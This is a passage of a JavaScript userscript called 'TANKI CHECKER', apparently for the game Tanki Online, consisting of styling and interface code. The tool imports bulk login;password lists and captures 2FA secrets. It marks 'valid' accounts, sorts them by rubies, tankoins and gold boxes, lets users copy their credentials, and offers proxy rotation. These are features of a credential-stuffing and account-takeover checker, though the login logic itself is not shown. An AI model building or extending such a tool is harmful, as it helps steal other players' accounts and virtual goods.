#tc-menu .tc-prem-row{display:flex;gap:14px;font-size:12px;color:var(--tc-text-muted) !important}
#tc-menu .tc-prem-row .val{font-weight:700;color:var(--tc-text) !important;margin-left:4px}
#tc-menu .tc-prem-foot{display:flex;justify-content:space-between;font-size:11px;color:var(--tc-text-dim) !important}
#tc-menu .tc-prem-progress{height:4px;border-radius:99px;background:var(--tc-surface-3);overflow:hidden;margin-top:4px}
#tc-menu .tc-prem-progress-bar{height:100%;background:var(--tc-accent);border-radius:99px}
#tc-menu .tc-prem-login .dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:var(--tc-success);margin-right:7px}
#tc-menu .tc-prem-login .dot.warn{background:var(--tc-warning)}
#tc-menu .tc-prem-login .dot.err{background:var(--tc-danger)}

#tc-menu .tc-selected-info{font-size:12px;color:var(--tc-text-muted) !important;margin-bottom:10px}
#tc-menu .tc-select-panel{display:none;max-height:180px;overflow:auto;padding:8px;border:1px solid var(--tc-border);border-radius:12px;background:var(--tc-surface);margin-bottom:10px}
#tc-menu .tc-select-panel.show{display:block}
#tc-menu .tc-select-item{display:flex;align-items:center;gap:8px;padding:6px 8px;font-size:12px;color:var(--tc-text) !important;cursor:pointer}

/* ===== DETAIL + ASSETS + GOLD MODALS ===== */
#tc-detail-modal,
#tc-assets-modal,
#tc-gold-modal{
  position:fixed;inset:0;z-index:100001;display:none;align-items:center;justify-content:center;
  background:rgba(0,0,0,.7);backdrop-filter:blur(10px);
  color:var(--tc-text) !important;
}
#tc-detail-modal.show{display:flex}
#tc-detail-modal .tc-detail-content,
#tc-assets-modal .tc-detail-content,
#tc-gold-modal .tc-detail-content{
  width:min(560px,calc(100vw - 32px));max-height:min(80vh,720px);overflow:auto;
  background:var(--tc-bg-2) !important;border:1px solid var(--tc-border);border-radius:18px;
  padding:18px 18px 16px;color:var(--tc-text) !important;box-shadow:var(--tc-shadow);
}
#tc-detail-modal .tc-detail-header,
#tc-assets-modal .tc-detail-header,
#tc-gold-modal .tc-detail-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;gap:12px}
#tc-detail-modal .tc-detail-title,
#tc-assets-modal .tc-detail-title,
#tc-gold-modal .tc-detail-title{font-size:16px;font-weight:800;color:var(--tc-text) !important}
#tc-detail-modal .tc-detail-close,
#tc-assets-modal .tc-detail-close,
#tc-gold-modal .tc-detail-close{
  width:32px;height:32px;border-radius:9px;border:1px solid var(--tc-border);
  background:var(--tc-surface) !important;color:var(--tc-text-muted) !important;cursor:pointer;
  font-size:14px;line-height:1;
}
#tc-detail-modal .tc-detail-row{
  display:flex;justify-content:space-between;gap:12px;padding:8px 0;
  border-bottom:1px solid var(--tc-border);font-size:13px;
}
#tc-detail-modal .tc-detail-label{color:var(--tc-text-muted) !important}
#tc-detail-modal .tc-detail-value{color:var(--tc-text) !important;font-weight:600;text-align:right;word-break:break-all}
#tc-detail-modal .tc-detail-actions{display:flex;gap:8px;margin-top:14px}

/* Shared cards outside #tc-menu (assets / gold modal lists) */
#tc-assets-modal .tc-account-card,
#tc-gold-modal .tc-account-card,
#tc-detail-modal .tc-account-card{
  display:flex;align-items:center;justify-content:space-between;gap:12px;
  padding:12px 14px;margin-bottom:8px;
  border-radius:12px;
  background:var(--tc-surface) !important;
  border:1px solid var(--tc-border);
  color:var(--tc-text) !important;
  cursor:pointer;
  transition:border-color .15s ease,background .15s ease;
}
#tc-assets-modal .tc-account-card:hover,
#tc-gold-modal .tc-account-card:hover,
#tc-detail-modal .tc-account-card:hover{
  border-color:var(--tc-border-2);background:var(--tc-surface-2) !important;
}
#tc-assets-modal .tc-account-card .login,
#tc-gold-modal .tc-account-card .login,
#tc-detail-modal .tc-account-card .login{
  font-size:13px;font-weight:700;color:var(--tc-text) !important;
}
#tc-assets-modal .tc-account-card .details,
#tc-gold-modal .tc-account-card .details,
#tc-detail-modal .tc-account-card .details{
  display:flex;flex-wrap:wrap;gap:6px;margin-top:4px;
}
#tc-assets-modal .tag,
#tc-gold-modal .tag,
#tc-detail-modal .tag{
  display:inline-flex;align-items:center;
  padding:2px 8px;border-radius:999px;
  background:var(--tc-surface-3) !important;
  border:1px solid var(--tc-border);
  font-size:10px;font-weight:600;
  color:var(--tc-text-muted) !important;
}
#tc-assets-modal .tc-empty,
#tc-gold-modal .tc-empty,
#tc-detail-modal .tc-empty{
  padding:28px 20px;text-align:center;
  border:1px dashed var(--tc-border-2);border-radius:14px;
  color:var(--tc-text-muted) !important;
}
#tc-assets-modal .tc-empty h4,
#tc-gold-modal .tc-empty h4,
#tc-detail-modal .tc-empty h4{margin:0 0 6px;color:var(--tc-text) !important;font-size:14px}
#tc-assets-modal .tc-empty p,
#tc-gold-modal .tc-empty p,
#tc-detail-modal .tc-empty p{margin:0;font-size:12px;color:var(--tc-text-dim) !important}
#tc-assets-modal #assets-modal-list,
#tc-gold-modal #gold-modal-list{overflow-y:auto;flex:1;padding:4px 0;min-height:120px}

/* ===== RUBIES ADD MODAL ===== */
#tc-rubies-add-modal{
  position:fixed;inset:0;z-index:100005;display:flex;align-items:center;justify-content:center;
  padding:20px;background:rgba(0,0,0,.72);backdrop-filter:blur(12px);
  opacity:0;visibility:hidden;pointer-events:none;transition:opacity .2s ease,visibility .2s;
}
#tc-rubies-add-modal.open{opacity:1;visibility:visible;pointer-events:auto}
#tc-rubies-add-modal .tc-rubies-add-card{
  width:min(680px,calc(100vw - 32px));max-height:min(760px,calc(100vh - 32px));overflow:auto;
  background:var(--tc-bg-2);border:1px solid var(--tc-border);border-radius:18px;
  box-shadow:var(--tc-shadow);color:var(--tc-text) !important;padding:18px;
}
#tc-rubies-add-modal .tc-rubies-add-head{display:flex;justify-content:space-between;gap:12px;margin-bottom:12px}
#tc-rubies-add-modal .tc-rubies-add-kicker{font-size:10px;font-weight:800;letter-spacing:.12em;text-transform:uppercase;color:var(--tc-text-dim) !important}
#tc-rubies-add-modal .tc-rubies-add-title{font-size:20px;font-weight:800;color:var(--tc-text) !important}
#tc-rubies-add-modal .tc-rubies-add-sub{font-size:12px;color:var(--tc-text-muted) !important;margin-top:4px;line-height:1.45}
#tc-rubies-add-modal .tc-rubies-add-close{
  width:34px;height:34px;border-radius:10px;border:1px solid var(--tc-border);
  background:var(--tc-surface);color:var(--tc-text-muted) !important;cursor:pointer;
}
#tc-rubies-add-modal .tc-rubies-add-label{display:block;font-size:10px;font-weight:800;letter-spacing:.1em;text-transform:uppercase;color:var(--tc-text-dim) !important;margin-bottom:8px}
#tc-rubies-add-modal #rubies-add-textarea{
  width:100%;min-height:200px;padding:12px;border-radius:12px;
  border:1px solid var(--tc-border);background:var(--tc-surface) !important;color:var(--tc-text) !important;
  font:13px/1.5 ui-monospace,Consolas,monospace;resize:vertical;
}
#tc-rubies-add-modal .tc-rubies-add-format{
  margin-top:10px;padding:12px;border-radius:12px;border:1px solid var(--tc-border);
  background:var(--tc-surface);font-size:11px;color:var(--tc-text-muted) !important;line-height:1.55;
}
#tc-rubies-add-modal .tc-rubies-add-format code{color:var(--tc-text) !important}
#tc-rubies-add-modal .tc-rubies-add-preview{
  margin-top:12px;padding:10px 12px;border-radius:10px;background:var(--tc-accent-soft);
  display:flex;justify-content:space-between;color:var(--tc-text) !important;font-size:12px;
}
#tc-rubies-add-modal .tc-rubies-add-actions{display:flex;justify-content:flex-end;gap:8px;margin-top:14px}

/* ===== TOASTS ===== */
.tc-toast-stack{position:fixed;right:18px;bottom:18px;z-index:100010;display:flex;flex-direction:column;gap:8px;pointer-events:none}
.tc-toast{
  pointer-events:auto;min-width:260px;max-width:360px;
  display:flex;gap:10px;align-items:flex-start;
  padding:12px 14px;border-radius:12px;
  background:var(--tc-bg-2);border:1px solid var(--tc-border);
  box-shadow:var(--tc-shadow);color:var(--tc-text) !important;
  opacity:0;transform:translateY(8px);transition:all .2s ease;
}
.tc-toast.show{opacity:1;transform:translateY(0)}
.tc-toast-title{font-size:12px;font-weight:800;color:var(--tc-text) !important}
.tc-toast-msg{font-size:12px;color:var(--tc-text-muted) !important;margin-top:2px}
.tc-toast.success{border-color:rgba(62,207,142,.35)}
.tc-toast.error{border-color:rgba(255,92,104,.35)}
.tc-toast.warning{border-color:rgba(240,180,41,.35)}

/* ===== PROXY BLOCK (settings) ===== */
#tc-menu #proxy-rotation-settings{
  margin-top:22px;padding:14px;border:1px solid var(--tc-border);border-radius:14px;
  background:var(--tc-surface);
}
#tc-menu .tc-pr-title{font-size:12px;font-weight:800;letter-spacing:.08em;color:var(--tc-text) !important}
#tc-menu .tc-pr-label{font-size:9px;text-transform:uppercase;letter-spacing:.08em;color:var(--tc-text-dim) !important}
#tc-menu .tc-pr-value,#tc-menu .tc-pr-time{color:var(--tc-text) !important}
#tc-menu .tc-pr-help{color:var(--tc-text-muted) !important}
#tc-menu .tc-pr-textarea{
  width:100%;min-height:100px;padding:10px;border-radius:10px;
  border:1px solid var(--tc-border);background:var(--tc-bg) !important;color:var(--tc-text) !important;
  font:12px/1.45 ui-monospace,Consolas,monospace;
}

/* ===== RESPONSIVE ===== */
@media(max-width:900px){
  #tc-panel{grid-template-columns:72px minmax(0,1fr)}
  #tc-menu .tc-brand-text,#tc-menu .tc-nav-label,#tc-menu .tc-tab span,#tc-menu .tc-sidebar-footer{display:none}
  #tc-menu .tc-tabs{padding:16px 8px}
  #tc-menu .tc-tab{justify-content:center;padding:0}
}
@media(max-width:650px){
  #tc-panel{
    grid-template-columns:1fr;
    grid-template-rows:64px 58px minmax(0,1fr);
    grid-template-areas:"header" "sidebar" "content";
    border-radius:16px;
  }
  #tc-menu .tc-tabs{
    flex-direction:row;padding:8px;overflow-x:auto;
    border-right:0;border-bottom:1px solid var(--tc-border);
  }
  #tc-menu .tc-brand,#tc-menu .tc-nav-label,#tc-menu .tc-sidebar-footer{display:none}
  #tc-menu .tc-tab{min-width:88px;justify-content:center}
  #tc-menu .tc-tab span{display:block;font-size:11px}
  #tc-menu .tc-header{padding:0 12px}
  #tc-menu .tc-chip{display:none}
  #tc-menu .tc-tab-content{padding:16px}
}
        `;
        document.head.appendChild(style);
    }


    // =========================================================
    // UI — RENDERING
    // =========================================================
    const ICONS = {
        dashboard:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="9"/><rect x="14" y="3" width="7" height="5"/><rect x="14" y="12" width="7" height="9"/><rect x="3" y="16" width="7" height="5"/></svg>',
        checker:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>',
        rubies:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 3h12l4 6-10 12L2 9z"/><path d="M11 3L8 9l4 12 4-12-3-6"/><path d="M2 9h20"/></svg>',
        accounts:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>',
        stats:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="20" x2="18" y2="10"/><line x1="12" y1="20" x2="12" y2="4"/><line x1="6" y1="20" x2="6" y2="14"/></svg>',
        settings:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>',
        theme:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>',
        close:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>',
        check:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>',
        x:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>',
        alert:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>',
        info:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>',
        download:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>',
        play:'<svg viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>',
        stop:'<svg viewBox="0 0 24 24" fill="currentColor"><rect x="5" y="5" width="14" height="14" rx="2"/></svg>',
        pause:'<svg viewBox="0 0 24 24" fill="currentColor"><rect x="6" y="4" width="4" height="16" rx="1"/><rect x="14" y="4" width="4" height="16" rx="1"/></svg>'
    };

    function createMenu() {
        if (document.getElementById("tc-menu")) return;
        injectStyles();

        const overlay = document.createElement("div");
        overlay.id = "tc-overlay";
        document.body.appendChild(overlay);

        const menu = document.createElement("div");
        menu.id = "tc-menu";
        menu.className = "tchecker-ui";
        menu.setAttribute("data-theme", CONFIG.THEME);
        menu.innerHTML = `
        <div id="tc-panel">
            <aside class="tc-tabs">
                <div class="tc-brand">
                    <div class="tc-brand-mark">yal</div>
                    <div class="tc-brand-text"><b>TANKI CHECKER</b><small>1.0.1</small></div>
                </div>
                <div class="tc-nav">
                    <div class="tc-nav-label">Main</div>
                    <button class="tc-tab active" data-tab="dashboard">${ICONS.dashboard}<span>Dashboard</span></button>
                    <button class="tc-tab" data-tab="checker">${ICONS.checker}<span>Checker</span></button>
                    <button class="tc-tab" data-tab="rubies">${ICONS.rubies}<span>Daily Rubies</span></button>
                    <div class="tc-nav-label">Library</div>
                    <button class="tc-tab" data-tab="accounts">${ICONS.accounts}<span>Accounts</span></button>
                    <button class="tc-tab" data-tab="results">${ICONS.stats}<span>Результаты</span></button>
                    <button class="tc-tab" data-tab="twofa">${ICONS.alert}<span>2FA</span></button>
                    <button class="tc-tab" data-tab="import">${ICONS.download}<span>Import / Export</span></button>
                    <div class="tc-nav-label">System</div>
                    <button class="tc-tab" data-tab="settings">${ICONS.settings}<span>Settings</span></button>
                </div>
                <div class="tc-sidebar-footer">prod. by yuuairline</div>
            </aside>
            <header class="tc-header">
                <div class="tc-header-left">
                    <div class="tc-title" id="tc-header-title">Dashboard</div>
                    <div class="tc-subtitle" id="tc-header-sub">Overview of the current state</div>
                </div>
                <div class="tc-header-right">
                    <div class="tc-chip idle" id="tc-header-status"><span class="dot"></span><span>System ready</span></div>
                    <button class="tc-icon-btn" id="tc-theme-toggle" title="Theme">${ICONS.theme}</button>
                    <button class="tc-icon-btn" id="tc-close" title="Close">${ICONS.close}</button>
                </div>
            </header>
            <div class="tc-tab-content active" id="tab-dashboard"></div>
            <div class="tc-tab-content" id="tab-checker"></div>
            <div class="tc-tab-content" id="tab-rubies"></div>
            <div class="tc-tab-content" id="tab-accounts"></div>
            <div class="tc-tab-content" id="tab-results"></div>
            <div class="tc-tab-content" id="tab-twofa"></div>
            <div class="tc-tab-content" id="tab-import"></div>
            <div class="tc-tab-content" id="tab-settings"></div>
        </div>`;
        document.body.appendChild(menu);

        const detailModal = document.createElement("div");
        detailModal.id = "tc-detail-modal";
        detailModal.className = "tchecker-ui";
        detailModal.setAttribute("data-theme", CONFIG.THEME);
        detailModal.innerHTML = `
        <div class="tc-detail-content">
            <div class="tc-detail-header">
                <div class="tc-detail-title">Account details</div>
                <button class="tc-detail-close" id="detail-close">✕</button>
            </div>
            <div id="detail-rows"></div>
            <div class="tc-detail-actions">
                <button class="tc-btn tc-btn-secondary" id="btn-copy-all">Copy</button>
                <button class="tc-btn tc-btn-danger" id="btn-delete">Delete</button>
            </div>
        </div>`;
        document.body.appendChild(detailModal);

        let toastStack = document.querySelector(".tc-toast-stack");
        if (!toastStack) {
            toastStack = document.createElement("div");
            toastStack.className = "tc-toast-stack tchecker-ui";
            toastStack.setAttribute("data-theme", CONFIG.THEME);
            document.body.appendChild(toastStack);
        }

        ensureRubiesAddModal();
        bindAllEvents();
        renderDashboard();
        renderChecker();
        renderRubies();
        renderAccounts();
        renderImport();
        renderSettings();
    }

    function ensureRubiesAddModal() {
        if (document.getElementById("tc-rubies-add-modal")) return;
        const modal = document.createElement("div");
        modal.id = "tc-rubies-add-modal";
        modal.className = "tchecker-ui";
        modal.setAttribute("data-theme", CONFIG.THEME);
        modal.innerHTML = `
            <div class="tc-rubies-add-card">
                <div class="tc-rubies-add-head">
                    <div>
                        <div class="tc-rubies-add-kicker">Daily Rubies</div>
                        <div class="tc-rubies-add-title">Добавить аккаунты</div>
                        <div class="tc-rubies-add-sub">Добавь отдельную очередь аккаунтов, которые будут использоваться только для ежедневного сбора наград.</div>
                    </div>
                    <button type="button" class="tc-rubies-add-close" id="rubies-add-close">✕</button>
                </div>
                <div class="tc-rubies-add-body">
                    <label class="tc-rubies-add-label">Список аккаунтов</label>
                    <textarea id="rubies-add-textarea" spellcheck="false" placeholder="23245325;12212332
ivan13000;d1f2y3z4

или

Ник - example
Пароль - 12345
Почта - mail@example.com"></textarea>
                    <div class="tc-rubies-add-format">
                        <b>Поддерживаемые форматы:</b><br>
                        <code>login;password</code> / <code>login:password</code><br>
                        блоки с <code>Логин</code> / <code>Пароль</code> / <code>Почта</code><br>
                        если есть строка <code>2FA secret - XXXX</code> — секрет автоматически попадёт во вкладку 2FA
                    </div>
                    <div class="tc-rubies-add-preview"><span>Распознано аккаунтов</span><strong id="rubies-add-count">0</strong></div>
                </div>
                <div class="tc-rubies-add-actions">
                    <button type="button" class="tc-btn tc-btn-secondary" id="rubies-add-cancel">Отмена</button>
                    <button type="button" class="tc-btn tc-btn-primary" id="rubies-add-submit">Добавить в Daily Rubies</button>
                </div>
            </div>`;
        document.body.appendChild(modal);

        const close = () => {
            modal.classList.remove("open");
        };
        const textarea = modal.querySelector("#rubies-add-textarea");
        const updateCount = () => {
            const parsed = sortAccounts(textarea.value || "");
            const count = modal.querySelector("#rubies-add-count");
            if (count) count.textContent = String(parsed.length);
        };
        modal.querySelector("#rubies-add-close").addEventListener("click", close);
        modal.querySelector("#rubies-add-cancel").addEventListener("click", close);
        modal.addEventListener("click", e => { if (e.target === modal) close(); });
        textarea.addEventListener("input", updateCount);
        modal.querySelector("#rubies-add-submit").addEventListener("click", () => {
            const value = textarea.value.trim();
            if (!value) return showToast("Вставь хотя бы один аккаунт", "warning");
            const result = addRubiesAccountsFromText(value);
            if (!result.added) {
                showToast("Не удалось распознать аккаунты", "warning");
                return;
            }
            textarea.value = "";
            updateCount();
            close();
            renderRubies();
            const extra = result.twofaLinked ? ` · 2FA: ${result.twofaLinked}` : "";
            showToast(`Добавлено в Daily Rubies: ${result.added}${extra}`, "success");
        });
    }

    function bindAllEvents() {
        document.getElementById("tc-close").addEventListener("click", closeMenu);
        document.getElementById("tc-overlay").addEventListener("click", closeMenu);
        document.getElementById("detail-close").addEventListener("click", closeDetailModal);
        document.getElementById("tc-detail-modal").addEventListener("click", e => {
            if (e.target.id === "tc-detail-modal") closeDetailModal();
        });

        document.querySelectorAll(".tc-tab").forEach(tab => {
            tab.addEventListener("click", () => {
                const tabId = tab.dataset.tab;
                currentTab = tabId;
                document.querySelectorAll(".tc-tab").forEach(t => t.classList.remove("active"));
                tab.classList.add("active");
                document.querySelectorAll(".tc-tab-content").forEach(c => c.classList.remove("active"));
                const content = document.getElementById(`tab-${tabId}`);
                if (content) content.classList.add("active");
                const titles = {
                    dashboard: ["Dashboard", "Overview of the current state"],
                    checker: ["Checker", "Account verification and metadata extraction"],
                    rubies: ["Daily Rubies", "Automated daily reward collection"],
                    accounts: ["Accounts", "Library and filters"],
                    results: ["Результаты", "Постоянное хранилище валидных аккаунтов"],
                    twofa: ["2FA", "Аккаунты с включённой двухфакторной аутентификацией"],
                    import: ["Import / Export", "Add accounts or export verified data"],
                    settings: ["Settings", "Script configuration"]
                };
                const t = titles[tabId] || titles.dashboard;
                document.getElementById("tc-header-title").textContent = t[0];
                document.getElementById("tc-header-sub").textContent = t[1];
                if (tabId === "dashboard") renderDashboard();
                if (tabId === "checker") renderChecker();
                if (tabId === "rubies") renderRubies();
                if (tabId === "accounts") renderAccounts();
                if (tabId === "results") renderResults();
                if (tabId === "twofa") render2FA();
                if (tabId === "settings") renderSettings();
            });
        });

        document.getElementById("tc-theme-toggle").addEventListener("click", toggleTheme);

        document.getElementById("btn-copy-all").addEventListener("click", () => {
            if (!selectedAccountLogin) return;
            const acc = ACCOUNTS.find(a => a.login === selectedAccountLogin) || RUBIES_ACCOUNTS.find(a => a.login === selectedAccountLogin);
            const st = getAccountStatus(selectedAccountLogin);
            if (!acc) return;
            const text = buildTxtForAccount(acc, st);
            copyToClipboard(text);
        });
        document.getElementById("btn-delete").addEventListener("click", () => {
            if (!selectedAccountLogin) return;
            if (!confirm(`Delete "${selectedAccountLogin}"?`)) return;
            ACCOUNTS = ACCOUNTS.filter(a => a.login !== selectedAccountLogin);
            saveAccounts();
            selectedAccountLogin = null;
            closeDetailModal();
            updateUI();
            renderAccounts();
            renderDashboard();
        });
    }

    function toggleTheme() {
        CONFIG.THEME = CONFIG.THEME === "dark" ? "light" : "dark";
        saveConfig();
        document.getElementById("tc-menu")?.setAttribute("data-theme", CONFIG.THEME);
        document.getElementById("tc-detail-modal")?.setAttribute("data-theme", CONFIG.THEME);
        document.getElementById("tc-rubies-add-modal")?.setAttribute("data-theme", CONFIG.THEME);
        document.getElementById("tc-assets-modal")?.setAttribute("data-theme", CONFIG.THEME);
        document.querySelector(".tc-toast-stack")?.setAttribute("data-theme", CONFIG.THEME);
        if (currentTab === "settings") renderSettings();
    }


    function getCheckQueueStats() {
        let total = 0, remaining = 0, done = 0, currentLogin = null;
        if (shuffledAccounts && shuffledAccounts.length) {
            total = shuffledAccounts.length;
            const idx = Math.min(Math.max(0, currentIndex), total);
            remaining = Math.max(0, total - idx);
            done = Math.max(0, idx);
            if (isRunning && idx < total) currentLogin = shuffledAccounts[idx]?.login || null;
        } else {
            try {
                const filtered = typeof getFilteredAccountsForCheck === "function"
                    ? getFilteredAccountsForCheck()
                    : (ACCOUNTS || []);
                const pending = (filtered || []).filter(a => a && a.login && !isAccountFinished(a.login));
                total = (filtered || []).length;
                remaining = pending.length;
                done = Math.max(0, total - remaining);
            } catch (_) {
                total = (ACCOUNTS || []).length;
                remaining = total;
            }
        }
        return { total, remaining, done, currentLogin };
    }

    function getAccountsWithAssets() {
        const list = [];
        for (const acc of ACCOUNTS) {
            const st = getAccountStatus(acc.login) || {};
            const rubies = parseInt(String(st.rubies || "0").replace(/\s/g, ""), 10) || 0;
            const tankoins = parseInt(String(st.tankoins || "0").replace(/\s/g, ""), 10) || 0;
            if (rubies > 0 || tankoins > 0) {
                list.push({
                    login: acc.login,
                    password: acc.password,
                    email: acc.email,
                    username: st.username || acc.login,
                    rank: st.rank || acc.rankFromBase || "—",
                    rubies,
                    tankoins,
                    crystals: st.crystals || "0"
                });
            }
        }
        list.sort((a, b) => (b.rubies - a.rubies) || (b.tankoins - a.tankoins));
        return list;
    }

    function parseGoldBoxesValue(v) {
        if (v === null || v === undefined || v === "" || v === "—") return null;
        const n = parseInt(String(v).replace(/\s/g, ""), 10);
        return Number.isFinite(n) && n >= 0 ? n : null;
    }

    function getAccountsWithGoldBoxes() {
        const list = [];
        for (const acc of ACCOUNTS) {
            const st = getAccountStatus(acc.login) || {};
            const gold = parseGoldBoxesValue(st.goldBoxes);
            if (gold === null || gold <= 0) continue;
            list.push({
                login: acc.login,
                password: acc.password,
                email: acc.email,
                username: st.username || acc.login,
                rank: st.rank || acc.rankFromBase || "—",
                goldBoxes: gold,
                rubies: st.rubies || "0",
                tankoins: st.tankoins || "0"
            });
        }
        list.sort((a, b) => b.goldBoxes - a.goldBoxes);
        return list;
    }

    function getTotalGoldBoxes() {
        let total = 0;
        for (const acc of ACCOUNTS) {
            const st = getAccountStatus(acc.login) || {};
            const gold = parseGoldBoxesValue(st.goldBoxes);
            if (gold) total += gold;
        }
        return total;
    }

    function openAssetsModal() {
        let modal = document.getElementById("tc-assets-modal");
        if (!modal) {
            modal = document.createElement("div");
            modal.id = "tc-assets-modal";
            modal.className = "tchecker-ui";
            modal.setAttribute("data-theme", CONFIG.THEME || "dark");
            modal.innerHTML = `
                <div class="tc-detail-content" style="max-width:560px;max-height:80vh;display:flex;flex-direction:column">
                    <div class="tc-detail-header">
                        <div class="tc-detail-title">Аккаунты с рубинами / танкоинами</div>
                        <button class="tc-detail-close" id="assets-modal-close">✕</button>
                    </div>
                    <div id="assets-modal-list" style="overflow-y:auto;flex:1;padding:4px 0"></div>
                </div>`;
            document.body.appendChild(modal);
            modal.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,.75);backdrop-filter:blur(10px);z-index:100001;display:none;align-items:center;justify-content:center;opacity:0;transition:opacity .2s";
            modal.addEventListener("click", e => { if (e.target === modal) closeAssetsModal(); });
            modal.querySelector("#assets-modal-close").addEventListener("click", closeAssetsModal);
        }
        modal.setAttribute("data-theme", CONFIG.THEME || "dark");
        const list = getAccountsWithAssets();
        const box = modal.querySelector("#assets-modal-list");
        if (!list.length) {
            box.innerHTML = `<div class="tc-empty"><h4>Нет аккаунтов</h4><p>Нет валидных аккаунтов с рубинами или танкоинами.</p></div>`;
        } else {
            box.innerHTML = list.map(a => `
                <div class="tc-account-card" data-login="${escapeHtml(a.login)}" style="cursor:pointer;margin-bottom:8px">
                    <div>
                        <div class="login">${escapeHtml(a.username || a.login)}</div>
                        <div class="details">
                            <span class="tag">${escapeHtml(a.login)}</span>
                            <span class="tag">${escapeHtml(a.rank)}</span>
                            <span class="tag">◆ ${formatAmount(String(a.rubies))}</span>
                            <span class="tag">🪙 ${formatAmount(String(a.tankoins))}</span>
                        </div>
                    </div>
                </div>`).join("");
            box.querySelectorAll(".tc-account-card").forEach(card => {
                card.addEventListener("click", () => {
                    selectedAccountLogin = card.dataset.login;
                    closeAssetsModal();
                    if (selectedAccountLogin) openDetailModal(selectedAccountLogin);
                });
            });
        }
        modal.style.display = "flex";
        requestAnimationFrame(() => { modal.style.opacity = "1"; });
    }

    function closeAssetsModal() {
        const modal = document.getElementById("tc-assets-modal");
        if (!modal) return;
        modal.style.opacity = "0";
        setTimeout(() => { modal.style.display = "none"; }, 200);
    }

    function openGoldBoxesModal() {
        let modal = document.getElementById("tc-gold-modal");
        if (!modal) {
            modal = document.createElement("div");
            modal.id = "tc-gold-modal";
            modal.className = "tchecker-ui";
            modal.setAttribute("data-theme", CONFIG.THEME || "dark");
            modal.innerHTML = `
                <div class="tc-detail-content" style="max-width:560px;max-height:80vh;display:flex;flex-direction:column">
                    <div class="tc-detail-header">
                        <div class="tc-detail-title">Аккаунты с золотыми ящиками</div>
                        <button class="tc-detail-close" id="gold-modal-close">✕</button>
                    </div>
                    <div id="gold-modal-list" style="overflow-y:auto;flex:1;padding:4px 0"></div>
                </div>`;
            document.body.appendChild(modal);
            modal.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,.75);backdrop-filter:blur(10px);z-index:100001;display:none;align-items:center;justify-content:center;opacity:0;transition:opacity .2s";
